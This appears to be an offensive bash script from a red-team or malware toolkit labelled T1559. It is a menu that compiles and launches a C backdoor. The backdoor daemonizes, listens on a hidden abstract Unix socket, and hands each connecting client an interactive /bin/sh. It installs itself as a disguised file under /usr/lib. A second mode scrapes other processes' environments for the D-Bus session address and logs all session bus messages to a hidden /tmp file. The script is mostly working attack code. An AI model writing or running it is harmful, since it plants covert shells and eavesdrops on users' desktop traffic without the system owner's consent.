#!/bin/bash
# T1559 — Inter-Process Communication: Abstract Unix Socket Hijacking
# Abuse abstract sockets (no filesystem entry) for covert IPC/MITM

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_abstract"
WORKDIR="/tmp/.${MARKER}"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1559 — Abstract Unix Socket Hijacking      ║"
    echo "  ║   Invisible sockets — no filesystem entry     ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

list_abstract_sockets() {
    echo -e "${CYAN}[*] Enumerating abstract sockets...${NC}"
    echo ""
    echo -e "  ${YELLOW}Active abstract sockets (from /proc/net/unix):${NC}"
    echo ""
    cat /proc/net/unix 2>/dev/null | awk '$NF ~ /^@/ {print "  "$NF}' | sort -u | head -30
    echo ""
    echo -e "  ${YELLOW}With process info (ss):${NC}"
    echo ""
    ss -xlp 2>/dev/null | grep '@' | head -20
}

deploy_abstract_hijack() {
    echo -e "${CYAN}[*] Deploying abstract socket hijacker${NC}"

    echo -e "${YELLOW}[*] Abstract sockets use \\\\0 prefix — no filesystem entry, invisible to ls."
    echo -e "    They exist only in the kernel namespace. Can be used for:"
    echo -e "    1. Covert C2 channel (no file, no port)"
    echo -e "    2. MITM D-Bus or other services (race to claim name)"
    echo -e "    3. Hidden IPC between implant components${NC}"
    echo ""

    echo -e "  ${CYAN}[a]${NC} Deploy covert C2 channel (abstract socket listener)"
    echo -e "  ${CYAN}[b]${NC} Deploy D-Bus session hijacker"
    echo ""
    read -p "  Choose [a/b]: " MODE

    if ! command -v gcc &>/dev/null; then
        echo -e "${RED}[!] gcc required${NC}"; return
    fi

    mkdir -p "$WORKDIR"

    case "$MODE" in
        a) deploy_covert_channel ;;
        b) deploy_dbus_race ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

deploy_covert_channel() {
    read -p "  Abstract socket name (e.g., /tmp/.X11-unix/X99): " SOCKNAME
    [[ -z "$SOCKNAME" ]] && SOCKNAME="/tmp/.ICE-unix/dcop"

    cat > "${WORKDIR}/abstract_c2.c" << CEOF
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <signal.h>

int main(int argc, char *argv[]) {
    const char *name = "${SOCKNAME}";
    daemon(0, 0);
    signal(SIGCHLD, SIG_IGN);

    int sock = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sock < 0) return 1;

    struct sockaddr_un addr;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    /* Abstract socket: first byte is \0 */
    addr.sun_path[0] = '\0';
    strncpy(addr.sun_path + 1, name, sizeof(addr.sun_path) - 2);

    socklen_t len = offsetof(struct sockaddr_un, sun_path) + 1 + strlen(name);

    if (bind(sock, (struct sockaddr *)&addr, len) < 0) return 1;
    listen(sock, 5);

    while (1) {
        int client = accept(sock, NULL, NULL);
        if (client < 0) continue;

        if (fork() == 0) {
            close(sock);
            /* Simple command shell over abstract socket */
            dup2(client, 0);
            dup2(client, 1);
            dup2(client, 2);
            execl("/bin/sh", "sh", "-i", NULL);
            _exit(1);
        }
        close(client);
    }
    return 0;
}
CEOF

    gcc -o "${WORKDIR}/abstract_c2" "${WORKDIR}/abstract_c2.c" 2>/dev/null
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Compilation failed${NC}"; return
    fi

    cp "${WORKDIR}/abstract_c2" /usr/lib/.libdcop_helper
    chmod 755 /usr/lib/.libdcop_helper
    /usr/lib/.libdcop_helper &

    echo -e "${GREEN}[+] Abstract socket C2 listener active: @${SOCKNAME}${NC}"
    echo -e "${YELLOW}[*] Connect: socat - ABSTRACT-CONNECT:${SOCKNAME}${NC}"
    echo -e "${YELLOW}[*] Or: python3 -c \"import socket; s=socket.socket(socket.AF_UNIX); s.connect('\\x00${SOCKNAME}')\"${NC}"
    echo -e "${YELLOW}[*] Invisible to: ls, find, lsof (no filesystem entry)${NC}"
}

deploy_dbus_race() {
    echo -e "${CYAN}[*] Attempting to claim D-Bus name before legitimate service...${NC}"

    # Create a Python-based D-Bus impersonator
    cat > "${WORKDIR}/dbus_hijack.py" << 'PYEOF'
#!/usr/bin/env python3
"""Race to claim a D-Bus well-known name before the real service"""
import os, sys, socket, struct

DBUS_SESSION = os.environ.get('DBUS_SESSION_BUS_ADDRESS', '')
if not DBUS_SESSION:
    # Try to find it from another user's process
    for pid_dir in os.listdir('/proc'):
        if not pid_dir.isdigit():
            continue
        try:
            env = open(f'/proc/{pid_dir}/environ', 'r').read()
            if 'DBUS_SESSION_BUS_ADDRESS=' in env:
                for part in env.split('\x00'):
                    if part.startswith('DBUS_SESSION_BUS_ADDRESS='):
                        DBUS_SESSION = part.split('=', 1)[1]
                        break
                if DBUS_SESSION:
                    break
        except:
            continue

if DBUS_SESSION:
    print(f"[+] Found D-Bus session: {DBUS_SESSION}")
else:
    print("[-] No D-Bus session found")
    sys.exit(1)

# Log intercepted messages
LOG = '/tmp/.d3m0n_dbus_intercept.log'
print(f"[*] Logging to {LOG}")
print("[*] Use dbus-monitor for full interception")
os.system(f"dbus-monitor --session > {LOG} 2>&1 &")
PYEOF
    chmod 755 "${WORKDIR}/dbus_hijack.py"

    if command -v python3 &>/dev/null; then
        python3 "${WORKDIR}/dbus_hijack.py"
    else
        echo -e "${RED}[!] python3 required for D-Bus hijack${NC}"
    fi
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up abstract socket implants...${NC}"

    pkill -f "libdcop_helper" 2>/dev/null
    pkill -f "dbus_hijack" 2>/dev/null
    pkill -f "d3m0n_dbus_intercept" 2>/dev/null
    rm -f /usr/lib/.libdcop_helper
    rm -f /tmp/.d3m0n_dbus_intercept.log
    rm -rf "$WORKDIR"

    echo -e "${GREEN}[+] Abstract socket implants removed${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} List active abstract sockets"
    echo -e "  ${CYAN}[2]${NC} Deploy abstract socket hijacker"
    echo -e "  ${CYAN}[3]${NC} Cleanup"
    echo ""
    read -p "Choose [1-3]: " OPT

    case "$OPT" in
        1) list_abstract_sockets ;;
        2) deploy_abstract_hijack ;;
        3) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
